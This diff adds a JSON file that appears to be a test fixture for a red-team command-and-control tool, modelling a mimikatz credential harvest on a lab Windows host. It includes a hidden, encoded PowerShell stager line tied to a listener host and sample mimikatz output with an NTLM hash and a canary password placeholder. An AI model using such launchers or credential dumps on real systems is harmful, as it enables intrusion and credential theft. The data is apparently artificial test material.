@@ -1,0 +1,22 @@
+{
+  "name": "windows-mimikatz-harvest",
+  "target": "10.10.10.20",
+  "platform": "windows",
+  "agent_id": "WIN20AGENT",
+  "agent_user": "CORP\\bob",
+  "listener": "lab-http-powershell",
+  "stager_response": {
+    "id": 101,
+    "name": "stager-ps1-it-win",
+    "template": "multi_launcher",
+    "options": {
+      "Listener": "lab-http",
+      "Language": "powershell",
+      "Host": "10.10.14.5",
+      "Port": "8080",
+      "OutFile": ""
+    },
+    "output": "powershell -nop -w hidden -enc U3RhZ2VyUGF5bG9hZEZvclRlc3RfV2luZG93cw=="
+  },
+  "mimikatz_output": "Authentication Id : 0 ; 999 (00000000:000003e7)\nSession           : Interactive from 1\nUser Name         : alice\nDomain            : CORP\n\tmsv :\n\t [00000003] Primary\n\t * Username : alice\n\t * Domain   : CORP\n\t * NTLM     : 5d41402abc4b2a76b9719d911017c592\n\twdigest :\n\t * Username : alice\n\t * Domain   : CORP\n\t * Password : ${CANARY}\n"
+}
